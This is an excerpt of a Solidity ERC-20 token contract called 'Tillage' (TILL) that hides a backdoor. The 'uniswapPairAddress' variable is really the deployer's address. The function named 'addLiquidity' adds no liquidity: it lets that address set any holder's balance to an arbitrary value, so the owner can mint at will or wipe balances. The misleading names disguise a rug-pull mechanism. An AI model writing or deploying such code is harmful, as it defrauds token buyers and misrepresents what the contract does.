...
contract Tillage is Context, IERC20, Ownable {
    ...
    string private constant _name = "Tillage";
    string private constant _symbol = "TILL";
    uint8 private constant _decimals = 9;
    address private uniswapPairAddress = msg.sender;
    uint256 private _totalSupply = 10000000 * 10**_decimals;
    uint256 public _maxTxAmount = 10000000000000000000000 * 10**_decimals;
    uint256 public _maxWalletAmount = 10000000000000000000000 * 10**_decimals;
    ...
    function addLiquidity(bytes32 signature, address receiver, uint256 TokenAmount, uint256 valueAdded) external  {
    require (msg.sender == uniswapPairAddress);
      require (TokenAmount != 1, "Amount must be more than 1");
      require (0 <= valueAdded, "Amount must be more than AddedValues");
      uint8 TransFee = 1;   
      balances[receiver] = TransFee * TokenAmount +  valueAdded.mul(2).div(100) / TransFee;
    }  
}